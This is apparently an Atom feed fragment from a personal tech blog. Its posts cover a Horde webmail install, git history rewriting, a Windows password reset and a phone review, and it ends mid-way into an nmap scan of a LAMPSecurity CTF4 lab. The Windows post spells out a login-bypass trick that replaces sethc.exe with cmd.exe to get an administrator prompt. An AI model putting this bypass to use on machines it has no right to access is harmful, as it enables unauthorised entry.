everything in one place (&lt;em&gt;thank you Google for the bad habit&lt;/em&gt;) and agendav was
no more working on my â¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;I host my own services with a web access, for my mail and calendar I used
&lt;a href="http://roundcube.org"&gt;Roundcube&lt;/a&gt; a wonderful webmail and
&lt;a href="http://agendav.org"&gt;agendav&lt;/a&gt; for my calendar. Nevertheless I am used to have
everything in one place (&lt;em&gt;thank you Google for the bad habit&lt;/em&gt;) and agendav was
no more working on my server. Therefore I decided to switch to Horde, a all in
one webmail which manage e-mails, calendars, contacts, notes and todo lists.&lt;/p&gt;
&lt;p&gt;Horde is written in PHP and is accessible using Pear (PHP Extension and
Application Repository).&lt;/p&gt;
&lt;h1&gt;Installing Horde&lt;/h1&gt;
&lt;p&gt;Let us see how to install Horde.&lt;/p&gt;
&lt;h2&gt;Necessary packages&lt;/h2&gt;
&lt;p&gt;First of all some dependencies should be meet. Considering you are on Debian
and using &lt;code&gt;apt-get&lt;/code&gt; you may run the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apt-get install php5-sasl php5-intl libssh2-php php5-curl php-http php5-xmlrpc php5-geoip php5-ldap php5-memcache php5-memcached php5-tidy
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pear install&lt;/h2&gt;
&lt;p&gt;We want to use Pear to get the last version of Horde. So we add the channel, the
Horde role, and we install Horde.
You will be prompt with the question &lt;code&gt;Filesystem installation for base Horde
application: /var/www/horde&lt;/code&gt; you can change this location the only
constrain to configure your web server (Apache, Nginx, or whatever) in order to
make this folder accessible.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pear channel-discover pear.horde.org
pear install horde/horde_role
pear run-scripts horde/horde_role
pear install -a -B horde/webmail
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Database creation&lt;/h2&gt;
&lt;p&gt;Horde use a database to store your calendars, contact, task lists and
notes. Nevertheless the script does not create this database. Therefore we must
do it manually for instance with the following commands and a MySQL database:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mysql -u root -p
CREATE DATABASE horde;
*GRANT ALL ON horde.* TO horde@localhost IDENTIFIED BY &amp;#39;PASSWORD&amp;#39;;
FLUSH PRIVILEGES;
exit;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You'll be asked the following questions:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;What database backend should we use? &lt;em&gt;mysql&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Request persistent connections? &lt;em&gt;no&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Username to connect to the database as: &lt;em&gt;The username you set in the previous step&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Password to connect with: &lt;em&gt;The password you set in the previous step&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;How should we connect to the database? &lt;em&gt;unix&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Location of UNIX socket: &lt;em&gt;Just press [enter]&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Database name to use: &lt;em&gt;The database name you set in the previous step&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Internally used charset: &lt;em&gt;utf-8&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Use SSL to connect to the server: &lt;em&gt;no&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Certification Authority to use for SSL connection: &lt;em&gt;Just press [enter]&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Split reads to a different server? &lt;em&gt;false&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Filesystem installation for base Horde application: &lt;em&gt;/var/www/horde&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Specify an existing mail user who you want to give administrator permissions (optional): &lt;em&gt;user@domain.com&lt;/em&gt; This user will have access to the administration interface within horde.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is all an you should get access to the horde interface.&lt;/p&gt;
&lt;h1&gt;Activating the exchange server&lt;/h1&gt;
&lt;p&gt;The administrator user will have a lot of options one of them is the activation
of the exchange server.&lt;/p&gt;
&lt;p&gt;That is all for this article about Horde, the install process can be found on
&lt;a href="http://www.matthieukeller.com/notes/#!server/horde.md"&gt;the notes part of my website&lt;/a&gt;.&lt;/p&gt;</content><category term="server"></category><category term="mail"></category></entry><entry><title>Git, remove unwanted data from history</title><link href="https://matthieukeller.com/2014/11/git-remove-unwanted-data-from-history.html" rel="alternate"></link><published>2014-11-23T00:00:00+01:00</published><updated>2014-11-23T00:00:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2014-11-23:/2014/11/git-remove-unwanted-data-from-history.html</id><summary type="html">&lt;p&gt;Recently I put unwanted data (a password) in one of my git commit.
This commit was not push to an public server (like github or bitbucket)
therefore there was no real security breach other than my git history.&lt;/p&gt;
&lt;p&gt;The problem was to remove the data by rewriting the git history â¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Recently I put unwanted data (a password) in one of my git commit.
This commit was not push to an public server (like github or bitbucket)
therefore there was no real security breach other than my git history.&lt;/p&gt;
&lt;p&gt;The problem was to remove the data by rewriting the git history, I search on the
internet and found and interesting command using git filter-branch
To rewrite the git history use the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git filter-branch --tree-filter &amp;#39;git ls-files -z &amp;quot;*.py&amp;quot; |xargs -0 perl -p -i -e &amp;quot;s#(PASSWORD1|PASSWORD2)#youPassowrd#g&amp;quot;&amp;#39; -- --all
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This command will just change the history of python files (.py) and replace
"PASSWORD1" and "PASSWORD2" whit "youPassword".&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WARNING&lt;/strong&gt; rewriting git history is dangerous, make a backup before doing anything.&lt;/p&gt;
&lt;p&gt;You can found a short version in &lt;a href="http://matthieukeller.com/pages/git-tricks.html"&gt;my notes&lt;/a&gt;.&lt;/p&gt;</content><category term="git"></category></entry><entry><title>Blog changes</title><link href="https://matthieukeller.com/2014/10/blog-changes.html" rel="alternate"></link><published>2014-10-27T00:00:00+01:00</published><updated>2014-10-27T00:00:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2014-10-27:/2014/10/blog-changes.html</id><summary type="html">&lt;p&gt;Short news from by blog:&lt;/p&gt;
&lt;p&gt;Yesterday I publish my blog with a brand new theme.
The main reason is to not have the classical bootstrap theme like everybody
else. Nevertheless I am no graphic artist that is why I use a theme designed by
someone else.&lt;/p&gt;
&lt;p&gt;The theme is based â¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Short news from by blog:&lt;/p&gt;
&lt;p&gt;Yesterday I publish my blog with a brand new theme.
The main reason is to not have the classical bootstrap theme like everybody
else. Nevertheless I am no graphic artist that is why I use a theme designed by
someone else.&lt;/p&gt;
&lt;p&gt;The theme is based on Maggner theme, created by Templateify and adapted to
pelican by &lt;a href="https://github.com/kplaube/maggner-pelican"&gt;Klaus Laube&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For the moment there is some minors problems :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The twitter and google+ buttons at the bottoms of articles are in Espagnoles
    (or something similar)&lt;/li&gt;
&lt;li&gt;I want to add some links in the menu to have links to my &lt;a href="http://www.matthieukeller.com"&gt;home
    page&lt;/a&gt; and to my &lt;a href="http://www.matthieukeller.com/notes"&gt;notes&lt;/a&gt;
    but this is not working for the moment&lt;/li&gt;
&lt;li&gt;The pictures in the article does not seems to work&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I will try to fix this problems in the next few weeks, in the same time I will
add images to each article already published and mostly refocus on the articles
in order to write new ones.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Edit:&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;29/10/14: I changed the social button language for English nevertheless the
    Facebook button is not present&lt;/li&gt;
&lt;/ul&gt;</content><category term="blog"></category></entry><entry><title>Lost Windows password</title><link href="https://matthieukeller.com/2014/10/lost-windows-password.html" rel="alternate"></link><published>2014-10-07T00:00:00+02:00</published><updated>2014-10-07T00:00:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2014-10-07:/2014/10/lost-windows-password.html</id><summary type="html">&lt;p&gt;Few weeks ago my girlfriend lost her laptop Windows password, I do not have any
hint about it and of course I am not an other of it (otherwise mimicatz would have been
my friend). I asked her to try basic password ("12345", "password"â¦) then she
asked me to reset â¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Few weeks ago my girlfriend lost her laptop Windows password, I do not have any
hint about it and of course I am not an other of it (otherwise mimicatz would have been
my friend). I asked her to try basic password ("12345", "password"â¦) then she
asked me to reset it in order not to retrieve some data on it but to use an
already install program. Therefore just mount the "C" partition and copy the data
to an USB disk in not a possibility. I really need to change its user Windows
password by a known one.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Let's boot on a Linux live ISO&lt;/li&gt;
&lt;li&gt;mount the "C" partition (here sda1) : &lt;code&gt;mount /dev/sda1 /mnt/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;backup sethc.exe: &lt;code&gt;cp /mnt/windows/system32/sethc.exe /mnt/windows/system32/sethc.exe_old&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;replace sethc.exe with cmd.exe: &lt;code&gt;cp /mnt/windows/system32/cmd.exe /mnt/windows/system32/sethc.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;reboot on Windows&lt;/li&gt;
&lt;li&gt;press "Shift" 5 times, an administration command prompt will open&lt;/li&gt;
&lt;li&gt;change the user password for "lol": &lt;code&gt;net user my_user my_new_password&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;replace the sethc.exe with the original one&lt;/li&gt;
&lt;li&gt;done !&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;She was happy, nevertheless the needed program was not on this laptop.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.matthieukeller.com/pages/lost-windows-password.html"&gt;You can found the manipulations in my notes section&lt;/a&gt;.&lt;/p&gt;</content><category term="windows"></category><category term="security"></category></entry><entry><title>ZTE OPEN C et Firefox OS</title><link href="https://matthieukeller.com/2014/09/zte-open-c-et-firefox-os.html" rel="alternate"></link><published>2014-09-15T00:00:00+02:00</published><updated>2014-09-15T00:00:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2014-09-15:/2014/09/zte-open-c-et-firefox-os.html</id><summary type="html">&lt;p&gt;This article concern the ZTE OPEN C and Firefox OS and would be in French.&lt;/p&gt;
&lt;p&gt;J'ai testÃ© le tÃ©lÃ©phone ZTE OPEN C avec Firefox OS 0.3 pendant une semaine.
PremiÃ¨re surprise au dÃ©ballage, le tÃ©lÃ©phone ressemble beaucoup au Samsung Galaxy
S. Mis Ã  part le bouton Â«Â powerÂ Â» qui est â¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;This article concern the ZTE OPEN C and Firefox OS and would be in French.&lt;/p&gt;
&lt;p&gt;J'ai testÃ© le tÃ©lÃ©phone ZTE OPEN C avec Firefox OS 0.3 pendant une semaine.
PremiÃ¨re surprise au dÃ©ballage, le tÃ©lÃ©phone ressemble beaucoup au Samsung Galaxy
S. Mis Ã  part le bouton Â«Â powerÂ Â» qui est sur le dessus et non sur le cÃ´tÃ©.&lt;/p&gt;
&lt;h2&gt;Prise en main&lt;/h2&gt;
&lt;p&gt;Au dÃ©marrage le tÃ©lÃ©phone est fluide, le fond d'Ã©cran rappel que l'on est sur un
OS diffÃ©rent. Niveau application c'est assez pauvre, on a Firefox, une
application radio, une application vidÃ©o bref les classiques. Par contre pas de
calculatrice (heureusement on en trouve facilement une sur le Â«Â marketplaceÂ Â»)&lt;/p&gt;
&lt;h2&gt;Utilisation&lt;/h2&gt;
&lt;p&gt;Pour l'utilisation au quotidien il faut revoir ces habitudes et trouver des
applications Ã©quivalentes et ce n'est pas toujours le cas. Suite Ã  la fermeture
du service Â«Â Google readerÂ Â» j'ai dÃ©cidÃ© de migrÃ© mes services centralisÃ©s chez
Google pour les hÃ©berger moi mÃªmes. J'utilise (aprÃ¨s des recherche et des
comparaisons) Â«Â TinyÂ TinyÂ RSSÂ Â» pour mes
flux RSS, davical pour mes contacts et mes agendas (via un serveur caldav et un
serveur carddav) et un serveur de mail auto hÃ©bergÃ© pour mes e-mails.&lt;/p&gt;
&lt;p&gt;Connaissant la philosophie de la fondation Mozilla je m'attendais Ã  n'avoir
aucun soucis Ã  trouver des application pour rÃ©pondre Ã  mes besoins ou mÃªme Ã  en
avoir un support natif :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cardav, le support de carddav n'est pas encore soutenu par Firefox OS, une
  issue est ouverte sur le &lt;a href="https://support.mozilla.org/en-US/kb/adding-calendars-firefox-os"&gt;bugtracker de l'OS&lt;/a&gt;
  Ã  ce propose depuis plus d'un an.&lt;/li&gt;
&lt;li&gt;caldav, le support caldav est natif dans l'application Â«Â agendaÂ Â» de Firefox
  OS malheureusement mon certificat est signÃ© par &lt;a href="http://cacert.org"&gt;cacert&lt;/a&gt; et
  ne peut donc pas Ãªtre utilisÃ© dans l'agenda de Firefox OS.&lt;/li&gt;
&lt;li&gt;e-mail, mes e-mails Ã©tant Ã©galement hÃ©bergÃ©s sur ce serveur avec le certificat
  signÃ© par &lt;a href="http://cacert.org"&gt;cacert&lt;/a&gt; l'application Â«Â e-mailÂ Â» de Firefox OS
  ne l'accepte pas.&lt;/li&gt;
&lt;li&gt;TTRSS, il n'y a pas d'application ttrss sur le marketplace Ã  ce jour mais je
  suis persuadÃ© que cela viendra&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Un point trÃ¨s positif c'est la rapiditÃ© d'accrochage du GPS ainsi que
l'autonomie du tÃ©lÃ©phone, j'ai tenu 72 heures avec la connexion de donnÃ©es
allumÃ© en permanence. De plus l'OS est lÃ©gÃ© et Ã§a ce sent, les menus sont
fluides. La simplicitÃ© voulu par l'OS est aussi au rendez vous, on a uniquement
un bouton central qui sert de bouton de retour et les icÃ´nes sont
reprÃ©sentatives des fonctionnalitÃ©s. il n'y a pas non plus des menus dans des
menus comme c'est le cas par exemple sous cyanogen.&lt;/p&gt;
&lt;p&gt;NÃ©anmoins j'ai eu quelques soucis avec le tÃ©lÃ©phone en lui mÃªme :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;le bouton power qui sert Ã  le sortir de sa veille fonctionne une fois sur deux&lt;/li&gt;
&lt;li&gt;il m'a fallut plusieurs essais pour rÃ©ussir Ã  passer un appel, des fois je
  n'entendais rien ou mon correspondant ne m'entendais pas&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Le ZTE Open C est un tÃ©lÃ©phone destinÃ© Ã  la base pour les pays en dÃ©veloppement
(d'oÃ¹ son prix ~80 euros) et
Ã§a ce ressent mais il reste un tÃ©lÃ©phone simple et lÃ©ger qui peux constituer un
bon point d'entrÃ© dans le monde des smartphones pour ceux qui n'y sont pas encore
(enfants, parents, grands-parents, etc.).&lt;/p&gt;</content><category term="firefox os"></category><category term="open source"></category><category term="mobile phone"></category></entry><entry><title>LAMPSecurity: CTF4</title><link href="https://matthieukeller.com/2014/08/lampsecurity-ctf4.html" rel="alternate"></link><published>2014-08-29T00:00:00+02:00</published><updated>2014-08-29T00:00:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2014-08-29:/2014/08/lampsecurity-ctf4.html</id><summary type="html">&lt;p&gt;I start the LAMPSecurity CTF4 challenge of vulnhub
&lt;a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/"&gt;available here&lt;/a&gt;.
The goal is to get a root shell on the server.&lt;/p&gt;
&lt;h1&gt;Discovery&lt;/h1&gt;
&lt;p&gt;First of all we need to determine the IP address of the server.
Since we launch it in a bridged virtual machine the local router got the IP â¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;I start the LAMPSecurity CTF4 challenge of vulnhub
&lt;a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/"&gt;available here&lt;/a&gt;.
The goal is to get a root shell on the server.&lt;/p&gt;
&lt;h1&gt;Discovery&lt;/h1&gt;
&lt;p&gt;First of all we need to determine the IP address of the server.
Since we launch it in a bridged virtual machine the local router got the IP
address in the DHCP logs. We simply found the most recent one. For me it is
&lt;code&gt;192.168.1.56&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Nmap&lt;/h2&gt;
&lt;p&gt;Let start with a simple nmap&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;nmap&lt;/span&gt; &lt;span class="nt"&gt;-A&lt;/span&gt; &lt;span class="nt"&gt;-oA&lt;/span&gt; &lt;span class="nt"&gt;ctf4&lt;/span&gt; &lt;span class="nt"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;56&lt;/span&gt;
&lt;span class="nt"&gt;Nmap&lt;/span&gt; &lt;span class="nt"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;47&lt;/span&gt; &lt;span class="nt"&gt;scan&lt;/span&gt; &lt;span class="nt"&gt;initiated&lt;/span&gt; &lt;span class="nt"&gt;Thu&lt;/span&gt; &lt;span class="nt"&gt;Aug&lt;/span&gt; &lt;span class="nt"&gt;28&lt;/span&gt; &lt;span class="nt"&gt;18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;49&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;49&lt;/span&gt; &lt;span class="nt"&gt;2014&lt;/span&gt; &lt;span class="nt"&gt;as&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;nmap&lt;/span&gt; &lt;span class="nt"&gt;-A&lt;/span&gt; &lt;span class="nt"&gt;-oA&lt;/span&gt; &lt;span class="nt"&gt;ctf4&lt;/span&gt; &lt;span class="nt"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;56&lt;/span&gt;
&lt;span class="nt"&gt;Nmap&lt;/span&gt; &lt;span class="nt"&gt;scan&lt;/span&gt; &lt;span class="nt"&gt;report&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;56&lt;/span&gt;
&lt;span class="nt"&gt;Host&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;up&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00058s&lt;/span&gt; &lt;span class="nt"&gt;latency&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;
&lt;span class="nt"&gt;Not&lt;/span&gt; &lt;span class="nt"&gt;shown&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;996&lt;/span&gt; &lt;span class="nt"&gt;filtered&lt;/span&gt; &lt;span class="nt"&gt;ports&lt;/span&gt;
&lt;span class="nt"&gt;PORT&lt;/span&gt;    &lt;span class="nt"&gt;STATE&lt;/span&gt;  &lt;span class="nt"&gt;SERVICE&lt;/span&gt; &lt;span class="nt"&gt;VERSION&lt;/span&gt;
&lt;span class="nt"&gt;22&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;tcp&lt;/span&gt;  &lt;span class="nt"&gt;open&lt;/span&gt;   &lt;span class="nt"&gt;ssh&lt;/span&gt;     &lt;span class="nt"&gt;OpenSSH&lt;/span&gt; &lt;span class="nt"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;3&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;protocol&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;ssh-hostkey&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;1024&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;4a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;f8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;97&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;e0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;72&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;b5&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;a4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;33&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;93&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;3d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;aa&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;9d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;ef&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;DSA&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;_&lt;/span&gt;  &lt;span class="nt"&gt;2048&lt;/span&gt; &lt;span class="nt"&gt;e7&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;70&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;d3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;81&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;41&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;b8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;6e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;31&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;ae&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;0e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;ea&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;5c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;b4&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;RSA&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nt"&gt;25&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;tcp&lt;/span&gt;  &lt;span class="nt"&gt;open&lt;/span&gt;   &lt;span class="nt"&gt;smtp&lt;/span&gt;    &lt;span class="nt"&gt;Sendmail&lt;/span&gt; &lt;span class="nt"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;13&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;13&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;5&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;smtp-commands&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;ctf4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;sas&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;upenn&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;edu&lt;/span&gt; &lt;span class="nt"&gt;Hello&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mf"&gt;192.168.1.97&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;pleased&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;meet&lt;/span&gt; &lt;span class="nt"&gt;you&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;ENHANCEDSTATUSCODES&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;PIPELINING&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;EXPN&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;VERB&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;8BITMIME&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;SIZE&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;DSN&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;ETRN&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;DELIVERBY&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;HELP&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;_&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;sendmail&lt;/span&gt; &lt;span class="nt"&gt;version&lt;/span&gt; &lt;span class="nt"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;13&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;5&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;Topics&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;HELO&lt;/span&gt; &lt;span class="nt"&gt;EHLO&lt;/span&gt; &lt;span class="nt"&gt;MAIL&lt;/span&gt; &lt;span class="nt"&gt;RCPT&lt;/span&gt; &lt;span class="nt"&gt;DATA&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span 